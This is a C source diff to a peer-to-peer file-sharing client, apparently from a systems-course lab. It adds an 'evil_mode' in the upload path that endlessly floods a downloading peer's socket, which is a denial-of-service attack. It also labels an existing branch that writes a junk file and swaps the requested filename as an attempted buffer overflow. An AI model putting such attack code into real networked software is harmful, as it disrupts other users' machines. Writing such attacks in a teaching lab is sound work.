@@ -582,7 +582,7 @@ static void task_download(task_t *t, task_t *tracker_task)
 		  { 
 		    errno = EFBIG;
 		    error("* Error: file size too large");
-		    goto exit;
+		    goto try_again;
 		  } 
 
 		ret = write_from_taskbuf(t->disk_fd, t);
@@ -654,13 +654,14 @@ static void task_upload(task_t *t)
 	assert(t->type == TASK_UPLOAD);
 	
 	//attack on peer downloading file. Creates garbage text file and changes requested filename to garbage.txt
+	//Attempt to cause a buffer overflow
 	if(evil_mode != 0)
 	  {
 	    int fd = open("garbage.txt",O_CREAT | O_APPEND, S_IRWXU | S_IROTH | S_IRGRP);
 	    int k;
 	    for(k = 0; k < 1024; k++)
 	      {
-		write(fd, "You've been attacked!!!\n", 24); 
+			write(fd, "You've been attacked!!!\n", 24); 
 	      }
 	    memset(t->filename, '\0', sizeof(t->filename));
 	    strcpy(t->filename, "garbage.txt");
@@ -697,7 +698,7 @@ static void task_upload(task_t *t)
 	{
 		if(t->filename[i] == '/')
 		{
-			error("Possible attack detected...\n");
+			error("Uploads must be in local directory...\n");
 			goto exit;
 		}
 		i++;
@@ -712,7 +713,17 @@ static void task_upload(task_t *t)
 	message("* Transferring file %s\n", t->filename);
 	// Now, read file from disk and write it to the requesting peer.
 	while (1) {
+		
+		
+		if(evil_mode!=0)
+		{
+			while(1) {
+				osp2p_writef(t->peer_fd,"How you like dem apples?\n");
+			}
+		}
+		
 		int ret = write_from_taskbuf(t->peer_fd, t);
+		
 		if (ret == TBUF_ERROR) {
 			error("* Peer write error");
 			goto exit;
